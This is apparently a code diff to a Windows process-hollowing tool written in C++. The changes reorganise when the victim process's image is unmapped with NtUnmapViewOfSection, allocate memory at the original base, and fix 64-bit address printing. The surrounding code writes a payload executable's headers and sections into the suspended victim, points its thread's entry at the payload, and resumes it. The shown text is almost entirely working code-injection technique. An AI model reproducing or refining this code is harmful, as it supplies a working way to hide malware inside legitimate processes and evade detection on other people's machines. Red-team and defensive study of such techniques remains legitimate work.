@@ -138,16 +138,6 @@ int _tmain(void*)
 	_tprintf(L"[+] Extracted image base address of victim process\r\n");
 	_tprintf(L"\t[*] Address: 0x%016llx\n", (ULONG64)pVictimImageBaseAddress);
 
-	// Unmap executable image from victim process    
-	DWORD dwResult = NtUnmapViewOfSection(pVictimProcessInfo->hProcess, pVictimImageBaseAddress);
-	if (dwResult) {
-		_tprintf(L"[-] Error unmapping section in victim process\r\n");
-		TerminateProcess(pVictimProcessInfo->hProcess, 1);
-		return 1;
-	}
-	_tprintf(L"[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
-	_tprintf(L"\t[*] Utilized base address of 0x%016llx\r\n", (ULONG64)pVictimImageBaseAddress);
-
 	// V.Allocate Memory in Victim Process
 
 	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pPayloadImage;
@@ -176,7 +166,7 @@ int _tmain(void*)
 			return 1;
 		}
 		_tprintf(L"[+] Allocated memory in victim process\r\n");
-		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016x\r\n", (UINT)pVictimHollowedAllocation);
+		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation);
 
 		// Write PE header into victim process
 		WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)pVictimHollowedAllocation, pPayloadImage, pNTHeaders->OptionalHeader.SizeOfHeaders, 0);
@@ -186,7 +176,7 @@ int _tmain(void*)
 			PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pPayloadImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
 			// Copy raw bytes of each section from PE file into the allocated memory at the correct RVA
 			WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)pPayloadImage + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, 0);
-			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
+			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016llx\r\n", pSectionHeader->Name, (ULONG64)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
 			_tprintf(L"\t\t[*] Replacement section header virtual address: 0x%016x\r\n", (UINT)pSectionHeader->VirtualAddress);
 			_tprintf(L"\t\t[*] Replacement section header pointer to raw data: 0x%016x\r\n", (UINT)pSectionHeader->PointerToRawData);
 		}
@@ -197,22 +187,32 @@ int _tmain(void*)
 		victimContext.Rcx = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 		SetThreadContext(pVictimProcessInfo->hThread, &victimContext);
 		_tprintf(L"[+] Victim process entry point set to payload image entry point in RCX register\n");
-		_tprintf(L"\t[*] Value is 0x%016x\r\n", (UINT)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
+		_tprintf(L"\t[*] Value is 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation + pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 		_tprintf(L"[+] Resuming victim process primary thread...\n");
 
 		ResumeThread(pVictimProcessInfo->hThread);
 	}
 	else
 	{
+		// Unmap executable image from victim process    
+		DWORD dwResult = NtUnmapViewOfSection(pVictimProcessInfo->hProcess, pVictimImageBaseAddress);
+		if (dwResult) {
+			_tprintf(L"[-] Error unmapping section in victim process\r\n");
+			TerminateProcess(pVictimProcessInfo->hProcess, 1);
+			return 1;
+		}
+		_tprintf(L"[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n");
+		_tprintf(L"\t[*] Utilized base address of 0x%016llx\r\n", (ULONG64)pVictimImageBaseAddress);
+
 		// Allocate memory for the payload image in the remote process
-		PVOID pVictimHollowedAllocation = VirtualAllocEx(pVictimProcessInfo->hProcess, nullptr, sizeOfPayloadImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+		PVOID pVictimHollowedAllocation = VirtualAllocEx(pVictimProcessInfo->hProcess, pVictimImageBaseAddress, sizeOfPayloadImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if (!pVictimHollowedAllocation) {
 			printf("[-] Unable to allocate memory in victim process %i\r\n", GetLastError());
 			TerminateProcess(pVictimProcessInfo->hProcess, 1);
 			return 1;
 		}
 		_tprintf(L"[+] Allocated memory in victim process\r\n");
-		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016x\r\n", (UINT)pVictimHollowedAllocation);
+		_tprintf(L"\t[*] pVictimHollowedAllocation = 0x%016llx\r\n", (ULONG64)pVictimHollowedAllocation);
 
 		// Calculate the delta between the preferred image base and the actual allocated base
 		const DWORD64 DeltaImageBase = (DWORD64)pVictimHollowedAllocation - pNTHeaders->OptionalHeader.ImageBase;
@@ -233,7 +233,7 @@ int _tmain(void*)
 				pPayloadImageRelocSection = pSectionHeader;
 			// Copy raw bytes of each section from PE file into the allocated memory at the correct RVA
 			WriteProcessMemory(pVictimProcessInfo->hProcess, (PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader->VirtualAddress), (PVOID)((LPBYTE)pPayloadImage + pSectionHeader->PointerToRawData), pSectionHeader->SizeOfRawData, 0);
-			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016x\r\n", pSectionHeader->Name, (UINT)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
+			_tprintf(L"\t[*] Section %hs written into victim process at 0x%016llx\r\n", pSectionHeader->Name, (ULONG64)pVictimHollowedAllocation + pSectionHeader->VirtualAddress);
 			_tprintf(L"\t\t[*] Replacement section header virtual address: 0x%016x\r\n", (UINT)pSectionHeader->VirtualAddress);
 			_tprintf(L"\t\t[*] Replacement section header pointer to raw data: 0x%016x\r\n", (UINT)pSectionHeader->PointerToRawData);
 		}
